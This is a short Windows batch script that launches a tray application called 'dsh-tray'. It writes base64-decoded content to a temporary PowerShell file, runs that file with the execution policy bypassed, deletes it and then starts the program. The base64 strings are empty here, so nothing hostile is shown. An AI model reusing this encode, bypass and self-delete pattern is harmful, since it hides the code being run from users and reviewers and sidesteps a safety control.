@echo off
setlocal
cd /d "%~dp0"

where powershell >nul 2>nul || (echo [dsh-tray] Error: PowerShell not found. & pause & exit /b 1)

echo [dsh-tray] building from source (whale icon + exe)...
del "%TEMP%\dsh-build.ps1" >nul 2>nul
powershell -NoProfile -Command "$p=$env:TEMP+'\dsh-build.ps1'; [IO.File]::WriteAllText($p,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('')), (New-Object System.Text.UTF8Encoding($true)))"
powershell -NoProfile -Command "$p=$env:TEMP+'\dsh-build.ps1'; [IO.File]::AppendAllText($p,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('')), (New-Object System.Text.UTF8Encoding($true)))"
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\dsh-build.ps1"
if errorlevel 1 goto :buildfail
del "%TEMP%\dsh-build.ps1" >nul 2>nul
echo [dsh-tray] build OK, launching...
start "" "%~dp0bin\DshTray.exe"
timeout /t 1 /nobreak >nul
exit /b 0
:buildfail
del "%TEMP%\dsh-build.ps1" >nul 2>nul
echo [dsh-tray] build failed. see output above.
pause
exit /b 1
